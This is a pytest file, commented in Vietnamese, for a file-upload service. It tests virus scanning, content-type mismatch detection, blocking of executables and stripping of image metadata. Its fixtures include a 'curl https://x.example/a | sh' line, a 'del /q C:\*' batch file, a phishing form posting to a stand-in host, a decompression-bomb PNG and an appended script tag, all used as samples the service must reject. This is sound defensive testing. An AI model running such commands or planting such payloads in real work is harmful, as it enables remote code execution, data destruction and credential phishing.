# Copyright 2026 Signet Team
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Tải lên kiểm nội dung: sau ClamAV, loại theo byte đầu phải khớp đuôi tệp (hay mime khai), không nhận tệp chạy được
(filetype.py); ảnh JPEG, PNG được bỏ EXIF, GPS, XMP, chú thích, xoay đúng chiều (imageclean.py); loại khác lưu nguyên
từng byte."""

import asyncio
import hashlib
import io
import struct
import uuid
import zlib

import pytest
from PIL import Image, ImageCms, PngImagePlugin

from conftest import EICAR, text_pdf
from svc_files import filetype, imageclean
from svc_files.imageclean import CleanError, clean, run_clean

GPS = {1: "N", 2: (21.0, 1.0, 37.0), 3: "E", 4: (105.0, 50.0, 2.0)}   # tọa độ chụp (Hà Nội)
HTML = b"<!DOCTYPE html><html><body><form action='https://gia-mao.example'>Dang nhap</form></body></html>"
PE = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 48 + b"PE\x00\x00" + b"\x00" * 64
OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504
OOXML = "application/vnd.openxmlformats-officedocument."


def auth(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def post(client, token, name: str, data: bytes, mime: str = "application/octet-stream"):
    files = {"file": (name, data, mime or "application/octet-stream")}
    return client.post("/api/files", headers=auth(token), files=files)


def zipped(*names: str) -> bytes:
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name in names:
            zf.writestr(name, "<x/>")
    return buf.getvalue()


def image(fmt: str, size=(40, 20), mode="RGB", **kw) -> bytes:
    """Ảnh hai nửa: trái xanh lam, phải đỏ — đủ để biết ảnh đã xoay đúng chiều chưa."""
    im = Image.new(mode, size, {"RGB": (255, 0, 0), "L": 200}.get(mode, (10, 20, 30, 40)))
    if mode == "RGB":
        im.paste((0, 0, 255), (0, 0, size[0] // 2, size[1]))
    out = io.BytesIO()
    im.save(out, fmt, **kw)
    return out.getvalue()


def camera_exif(orientation: int = 1) -> Image.Exif:
    exif = Image.Exif()
    exif[0x0112] = orientation
    exif[0x010F] = "Canon"
    exif[0x0132] = "2026:10:24 07:15:00"
    exif[0x8825] = GPS
    return exif


def png_text() -> PngImagePlugin.PngInfo:
    info = PngImagePlugin.PngInfo()
    info.add_text("Author", "Nguyen Van A")
    info.add_itxt("Location", "21.0270,105.8342", zip=True)
    return info


def huge_png(width: int, height: int) -> bytes:
    """PNG khai kích thước khổng lồ mà gần như không có dữ liệu — ảnh bom giải nén."""
    def chunk(kind: bytes, body: bytes) -> bytes:
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", zlib.crc32(kind + body))

    ihdr = struct.pack(">IIBBBBB", width, height, 8, 0, 0, 0, 0)
    idat = chunk(b"IDAT", zlib.compress(b"\x00" * 64))
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + idat + chunk(b"IEND", b"")


def stored(store, hasura, body: dict) -> bytes:
    """Byte trong kho của tệp vừa tải; kiểm băm, cỡ ở phản hồi, kho, core.files đều là của chính byte đó."""
    row = hasura.files[uuid.UUID(body["id"])]
    data = store.objects[row["object_key"]]["data"]
    sha = hashlib.sha256(data).hexdigest()
    assert body["sha256"] == row["sha256_hex"] == store.objects[row["object_key"]]["sha256"] == sha
    assert body["size_bytes"] == row["size_bytes"] == len(data)
    assert body["mime_type"] == row["mime_type"]
    return data


# --- nội dung không khớp: chặn, không lưu ---------------------------------------------------------------------


@pytest.mark.parametrize(("name", "data", "mime", "found"), [
    ("hoa-don.pdf", HTML, "application/pdf", "text/html"),             # trang lừa đăng nhập đội lốt PDF
    ("anh-the.jpg", text_pdf("x"), "image/jpeg", "application/pdf"),
    ("bao-cao.docx", b"%PDF-1.7\n" + b"x" * 100, OOXML + "wordprocessingml.document", "application/pdf"),
    ("bang-luong.xlsx", HTML, "application/octet-stream", "text/html"),
    ("ghi-chu.txt", OLE, "text/plain", "application/x-ole-storage"),
    ("hoa-don", HTML, "application/pdf", "text/html"),                  # không đuôi: xét mime khai
])
def test_content_that_is_not_its_declared_type_is_415(client, make_token, scanner, store, hasura, name, data, mime,
                                                       found):
    r = post(client, make_token(), name, data, mime)
    assert r.status_code == 415, r.text
    detail = r.json()["detail"]
    assert detail["code"] == "type_mismatch" and detail["found"] == found
    assert "không khớp" in detail["message"]
    assert scanner.scanned == data              # ClamAV đã quét đủ byte gốc trước khi nhận loại
    assert store.objects == {} and hasura.files == {} and hasura.events == []


@pytest.mark.parametrize(("name", "data"), [
    ("hoa-don.pdf", PE),                          # chương trình Windows đổi đuôi
    ("setup.exe", PE),
    ("tep-khong-ten", b"\x7fELF\x02\x01\x01" + b"\x00" * 64),
    ("ghi-chu.txt", b"#!/bin/sh\ncurl https://x.example/a | sh\n"),
    ("cai-dat.bat", b"@echo off\r\ndel /q C:\\*\r\n"),         # chữ thuần, chặn theo đuôi
    ("Hoa don.PDF.js", b"WScript.Echo('x')"),
    ("tai-lieu.exe.", b"van ban"),                  # Windows bỏ dấu chấm cuối tên: mở như .exe
])
def test_runnable_files_are_not_allowed(client, make_token, store, hasura, name, data):
    r = post(client, make_token(), name, data)
    assert r.status_code == 415, r.text
    assert r.json()["detail"]["code"] == "type_not_allowed"
    assert store.objects == {} and hasura.files == {}


def test_rejection_is_logged_without_the_file_name(client, make_token, log_records):
    r = post(client, make_token(sub="u-1"), "don-0912345678.pdf", HTML, "application/pdf")
    assert r.status_code == 415
    (event,) = [e for e in log_records if e["event"] == "core.file.type_rejected"]
    assert event["code"] == "type_mismatch" and event["found"] == "text/html" and event["extension"] == "pdf"
    assert event["actor_id"] == "u-1" and "0912345678" not in str(event)


# --- ClamAV vẫn đứng trước: EICAR đổi đuôi là tệp nhiễm, không phải 415 ---------------------------------------


@pytest.mark.parametrize("name", ["eicar.pdf", "eicar.jpg", "eicar.png", "eicar.exe", "eicar"])
def test_eicar_is_quarantined_before_any_type_check(client, make_token, scanner, store, hasura, name):
    r = post(client, make_token(sub="u-1"), name, EICAR, "application/pdf")
    assert r.status_code == 422, r.text
    assert r.json()["detail"]["code"] == "infected"
    assert scanner.scanned == EICAR and store.objects == {} and hasura.files == {}
    (event,) = hasura.events
    assert event["action"] == "file.rejected" and event["entity_id"] == hashlib.sha256(EICAR).hexdigest()


def test_scanner_down_is_503_even_for_a_disguised_file(client, make_token, scanner, store):
    scanner.down = True
    r = post(client, make_token(), "hoa-don.pdf", HTML, "application/pdf")
    assert r.status_code == 503 and r.json()["detail"]["code"] == "scanner_unavailable"
    assert store.objects == {}


# --- loại vẫn nhận như trước: lưu nguyên từng byte, mime theo nội dung -----------------------------------------


ACCEPTED = [
    ("cong-van.pdf", text_pdf("Cong van so 12"), "application/pdf", "application/pdf"),
    ("cong-van.pdf", text_pdf("Cong van so 12"), "image/png", "application/pdf"),     # trình duyệt khai sai
    ("scan-khong-duoi", text_pdf("Ban scan"), "application/octet-stream", "application/pdf"),
    ("anh.gif", image("GIF"), "image/gif", "image/gif"),
    ("anh.tif", image("TIFF"), "image/tiff", "image/tiff"),
    ("anh.bmp", image("BMP"), "image/bmp", "image/bmp"),
    ("anh.webp", image("WEBP"), "image/webp", "image/webp"),
    ("anh.heic", b"\x00\x00\x00\x18ftypheic" + b"\x00" * 64, "image/heic", "image/heic"),
    ("anh-tai-ve.jpg", image("WEBP"), "image/jpeg", "image/webp"),        # ảnh WebP mang đuôi .jpg: vẫn là ảnh
    ("anh-iphone.jpg", b"\x00\x00\x00\x18ftypheic" + b"\x00" * 64, "image/jpeg", "image/heic"),   # không làm sạch
    ("du-thao.docx", zipped("[Content_Types].xml", "word/document.xml"), "", OOXML + "wordprocessingml.document"),
    ("bang-diem.xlsx", zipped("[Content_Types].xml", "xl/workbook.xml"), "", OOXML + "spreadsheetml.sheet"),
    ("trinh-bay.pptx", zipped("[Content_Types].xml", "ppt/presentation.xml"), "",
     OOXML + "presentationml.presentation"),
    ("co-mat-khau.docx", OLE, "", OOXML + "wordprocessingml.document"),     # docx đặt mật khẩu nằm trong vỏ OLE
    ("bien-ban.odt", zipped("mimetype", "content.xml"), "", "application/vnd.oasis.opendocument.text"),
    ("cong-van-cu.doc", OLE, "application/msword", "application/msword"),
    ("bang-cu.xls", OLE, "application/vnd.ms-excel", "application/vnd.ms-excel"),
    ("xuat-tu-phan-mem.xls", b"<html><body><table><tr><td>1</td></tr></table></body></html>",
     "application/vnd.ms-excel", "application/vnd.ms-excel"),                # "xls" là bảng HTML do phần mềm khác xuất
    ("thu-moi.doc", b"{\\rtf1\\ansi Thu moi}", "application/msword", "application/msword"),
    ("thu.rtf", b"{\\rtf1\\ansi Thu}", "application/rtf", "application/rtf"),
    ("tep-nen.zip", zipped("a.pdf"), "application/x-zip-compressed", "application/zip"),
    ("tep-nen.7z", b"7z\xbc\xaf\x27\x1c\x00\x04" + b"\x00" * 32, "", "application/x-7z-compressed"),
    ("tep-nen.rar", b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32, "", "application/vnd.rar"),
    ("danh-sach.csv", "STT,Họ tên\n1,Nguyễn Văn A\n".encode(), "application/vnd.ms-excel", "text/csv"),   # Windows
    ("danh-sach.csv", "STT,Họ tên\r\n1,Nguyễn Văn A\r\n".encode("utf-16"), "text/csv", "text/csv"),   # UTF-16 có BOM
    ("ghi-chu.txt", "Ghi chú họp giao ban".encode(), "text/plain", "text/plain"),
    ("tcvn3.txt", b"C\xb8c \xae\xa9n v\xfb ph\xe8i h\xefp", "text/plain", "text/plain"),     # chữ Việt mã TCVN3
    ("ghi-chu.txt", HTML, "text/plain", "text/plain"),                    # đuôi chữ: lưu là chữ trần
    ("README.md", b"# Huong dan\n\n- buoc 1\n", "", "text/markdown"),
    ("du-lieu.json", b'{"so": 1}', "application/json", "application/json"),
    ("hoa-don.xml", b'<?xml version="1.0"?><HDon><TTChung/></HDon>', "text/xml", "application/xml"),
    ("trang.html", HTML, "text/html", "text/html"),
    ("bieu-tuong.svg", b'<svg xmlns="http://www.w3.org/2000/svg"/>', "image/svg+xml", "image/svg+xml"),
    ("hop.mp4", b"\x00\x00\x00\x18ftypmp42" + b"\x00" * 64, "video/mp4", "video/mp4"),
    ("ghi-am.mp3", b"ID3\x04\x00\x00\x00\x00\x00\x00" + b"\xff\xfb" * 32, "audio/mpeg", "audio/mpeg"),
    ("ban-ve.dwg", b"AC1032" + b"\x00\x01\x02" * 50, "image/vnd.dwg", "application/octet-stream"),   # loại lạ
]


@pytest.mark.parametrize(("name", "data", "mime", "expected"), ACCEPTED,
                         ids=[f"{a[0]}:{a[2] or '-'}" for a in ACCEPTED])
def test_legitimate_types_are_stored_byte_for_byte(client, make_token, store, hasura, name, data, mime, expected):
    r = post(client, make_token(), name, data, mime)
    assert r.status_code == 201, r.text
    body = r.json()
    assert body["mime_type"] == expected and body["filename"] == name
    assert stored(store, hasura, body) == data


def test_pdf_stays_byte_identical_for_the_verification_portal(client, make_token, store, hasura):
    from pypdf import PdfReader, PdfWriter

    writer = PdfWriter(clone_from=PdfReader(io.BytesIO(text_pdf("Quyet dinh so 5"))))
    writer.add_metadata({"/Author": "Nguyen Van A", "/Producer": "May scan tang 3"})
    out = io.BytesIO()
    writer.write(out)
    pdf = out.getvalue()
    r = post(client, make_token(), "quyet-dinh.pdf", pdf, "application/pdf")
    assert r.status_code == 201
    assert stored(store, hasura, r.json()) == pdf and r.json()["sha256"] == hashlib.sha256(pdf).hexdigest()


# --- ảnh: bỏ siêu dữ liệu, xoay đúng chiều --------------------------------------------------------------------


def test_jpeg_loses_exif_gps_xmp_and_comment(client, make_token, store, hasura):
    original = image("JPEG", exif=camera_exif(), xmp=b"<x:xmpmeta>GPSLatitude 21.0270</x:xmpmeta>",
                     comment=b"Nha rieng", dpi=(300, 300), quality=90)
    assert Image.open(io.BytesIO(original)).getexif().get_ifd(0x8825)
    r = post(client, make_token(), "anh-chup.jpg", original, "image/jpeg")
    assert r.status_code == 201, r.text
    body = r.json()
    data = stored(store, hasura, body)
    assert body["mime_type"] == "image/jpeg" and body["sha256"] != hashlib.sha256(original).hexdigest()
    got = Image.open(io.BytesIO(data))
    assert dict(got.getexif()) == {} and "exif" not in got.info and "comment" not in got.info
    assert got.info.get("dpi") == (300, 300) and got.size == (40, 20)
    for leak in (b"Exif", b"Canon", b"2026:10:24", b"GPSLatitude", b"xmpmeta", b"Nha rieng"):
        assert leak not in data, leak


@pytest.mark.parametrize(("orientation", "size", "blue", "red"), [
    (1, (40, 20), (5, 10), (35, 10)),
    (6, (20, 40), (10, 5), (10, 35)),      # chụp dọc (xoay 90° theo chiều kim đồng hồ khi hiện)
    (3, (40, 20), (35, 10), (5, 10)),      # lộn ngược
    (8, (20, 40), (10, 35), (10, 5)),
])
def test_jpeg_is_turned_upright_before_exif_is_dropped(client, make_token, store, hasura, orientation, size, blue,
                                                       red):
    r = post(client, make_token(), "anh.jpg", image("JPEG", exif=camera_exif(orientation), quality=95), "image/jpeg")
    assert r.status_code == 201, r.text
    got = Image.open(io.BytesIO(stored(store, hasura, r.json()))).convert("RGB")
    assert got.size == size and 0x0112 not in got.getexif()
    b, rd = got.getpixel(blue), got.getpixel(red)
    assert b[2] > 200 and b[0] < 60, b
    assert rd[0] > 200 and rd[2] < 60, rd


def test_png_loses_text_and_exif_but_keeps_pixels_and_transparency(client, make_token, store, hasura):
    im = Image.new("RGBA", (30, 10), (255, 0, 0, 128))
    icc = ImageCms.ImageCmsProfile(ImageCms.createProfile("sRGB")).tobytes()
    out = io.BytesIO()
    im.save(out, "PNG", pnginfo=png_text(), exif=camera_exif(8), icc_profile=icc, dpi=(150, 150))
    original = out.getvalue()
    r = post(client, make_token(), "so-do.png", original, "image/png")
    assert r.status_code == 201, r.text
    data = stored(store, hasura, r.json())
    got = Image.open(io.BytesIO(data))
    got.load()
    assert got.size == (10, 30) and got.mode == "RGBA" and got.getpixel((5, 5)) == (255, 0, 0, 128)
    assert set(got.info) == {"icc_profile", "dpi"} and got.info["icc_profile"] == icc
    for leak in (b"tEXt", b"iTXt", b"zTXt", b"eXIf", b"Nguyen", b"Canon"):
        assert leak not in data, leak


def test_png_named_jpg_is_kept_and_cleaned_as_png(client, make_token, store, hasura):
    original = image("PNG", pnginfo=png_text())
    r = post(client, make_token(), "anh-chup-man-hinh.jpg", original, "image/jpeg")
    assert r.status_code == 201, r.text
    assert r.json()["mime_type"] == "image/png" and r.json()["filename"] == "anh-chup-man-hinh.jpg"
    data = stored(store, hasura, r.json())
    assert data.startswith(b"\x89PNG") and b"Nguyen" not in data


def test_image_with_bytes_glued_after_it_loses_them(client, make_token, store, hasura):
    original = image("JPEG") + b"<html><script>alert(1)</script></html>" + zipped("x.exe")
    r = post(client, make_token(), "anh.jpg", original, "image/jpeg")
    assert r.status_code == 201, r.text
    data = stored(store, hasura, r.json())
    assert data.endswith(b"\xff\xd9") and b"<script>" not in data and b"PK\x03\x04" not in data


@pytest.mark.parametrize(("name", "data", "reason"), [
    ("anh.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + b"\x13" * 200, "corrupt"),
    ("anh.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 200, "corrupt"),
    ("bom.png", huge_png(30_000, 30_000), "too_many_pixels"),
])
def test_image_that_cannot_be_cleaned_is_not_stored(client, make_token, store, hasura, name, data, reason):
    r = post(client, make_token(), name, data)
    assert r.status_code == 422, r.text
    detail = r.json()["detail"]
    assert detail["code"] == "image_unreadable" and detail["reason"] == reason
    assert "siêu dữ liệu" in detail["message"]
    assert store.objects == {} and hasura.files == {}


def test_restricted_upload_of_an_image_is_refused_before_it_is_decoded(client, make_token, store):
    r = client.post("/api/files?restricted=true", headers=auth(make_token()),
                    files={"file": ("anh.png", huge_png(30_000, 30_000), "image/png")})
    assert r.status_code == 415 and r.json()["detail"]["code"] == "restricted_pdf_only"
    assert store.objects == {}


# --- imageclean trực tiếp ----------------------------------------------------------------------------------------


def test_clean_keeps_every_frame_of_an_animated_png():
    frames = [Image.new("RGB", (8, 8), c) for c in ((255, 0, 0), (0, 255, 0), (0, 0, 255))]
    out = io.BytesIO()
    frames[0].save(out, "PNG", save_all=True, append_images=frames[1:], duration=[100, 200, 300], loop=2,
                   pnginfo=png_text())
    got = Image.open(io.BytesIO(clean(out.getvalue(), "PNG")))
    assert got.n_frames == 3 and got.info["loop"] == 2 and "Author" not in got.info
    got.seek(2)
    assert got.info["duration"] == 300 and got.convert("RGB").getpixel((0, 0)) == (0, 0, 255)


@pytest.mark.parametrize("mode", ["L", "CMYK"])
def test_clean_keeps_grey_and_cmyk_jpegs(mode):
    original = image("JPEG", mode=mode, exif=camera_exif())
    got = Image.open(io.BytesIO(clean(original, "JPEG")))
    assert got.mode == mode and dict(got.getexif()) == {}


def test_clean_keeps_palette_transparency():
    im = Image.new("P", (4, 4), 1)
    im.putpalette([0, 0, 0, 255, 255, 255] + [0] * 762)
    out = io.BytesIO()
    im.save(out, "PNG", transparency=0, pnginfo=png_text())
    got = Image.open(io.BytesIO(clean(out.getvalue(), "PNG")))
    assert got.mode == "P" and got.info == {"transparency": 0}


def test_run_clean_reports_reasons_and_never_hangs():
    with pytest.raises(CleanError) as exc:
        asyncio.run(run_clean(b"\xff\xd8\xff\xe0 khong phai anh", "image/jpeg"))
    assert exc.value.reason == "corrupt"
    with pytest.raises(CleanError) as exc:
        asyncio.run(run_clean(huge_png(20_000, 20_000), "image/png"))
    assert exc.value.reason == "too_many_pixels"
    with pytest.raises(CleanError) as exc:
        asyncio.run(run_clean(image("PNG"), "image/png", timeout_s=0.001))
    assert exc.value.reason == "timeout"
    assert asyncio.run(run_clean(image("PNG"), "image/png")).startswith(b"\x89PNG")
    assert set(imageclean.FORMATS) == {"image/jpeg", "image/png"}


# --- filetype trực tiếp ------------------------------------------------------------------------------------------


@pytest.mark.parametrize(("head", "family", "mime"), [
    (b"BM is a text file, not a bitmap", "text", "text/plain"),             # "BM" đầu dòng chữ không phải ảnh BMP
    (b"MZ Corp report 2026", "text", "text/plain"),           # "MZ" không kèm phần đầu DOS không phải chương trình
    (b"ID3 tags of the album", "text", "text/plain"),
    (b"\xef\xbb\xbf<html><body>x", "text", "text/html"),     # BOM UTF-8 trước thẻ
    (b"  \n<!-- ghi chu --> <p>x</p>", "text", "text/html"),
    (b"<?xml version='1.0'?>\n<svg xmlns='http://www.w3.org/2000/svg'/>", "text", "image/svg+xml"),
    ("<b>chữ đậm</b>".encode("utf-16-le"), "text", "text/html"),     # UTF-16 không BOM
    (b"\x00\x01\x02\x03" * 16, "", "application/octet-stream"),
    (b"\xca\xfe\xba\xbe\x00\x00\x00\x34", "exe", "application/java-vm"),
])
def test_detect(head, family, mime):
    kind = filetype.detect(head)
    assert (kind.family, kind.mime) == (family, mime)


@pytest.mark.parametrize(("name", "ext"), [
    ("Báo cáo.PDF", "pdf"), ("a.tar.gz", "gz"), ("a.exe.", "exe"), ("a.exe . ", "exe"), (".htaccess", ""),
    ("tep-khong-ten", ""),
])
def test_extension(name, ext):
    assert filetype.extension(name) == ext


def test_every_extension_and_alias_maps_to_a_storable_mime():
    from svc_files.app import MIME_RE

    for ext, (mime, families) in filetype.EXTENSIONS.items():
        assert MIME_RE.match(mime) and families and ext not in filetype.RUNNABLE, ext
    for alias in filetype.ALIASES:
        assert alias in filetype.MIMES
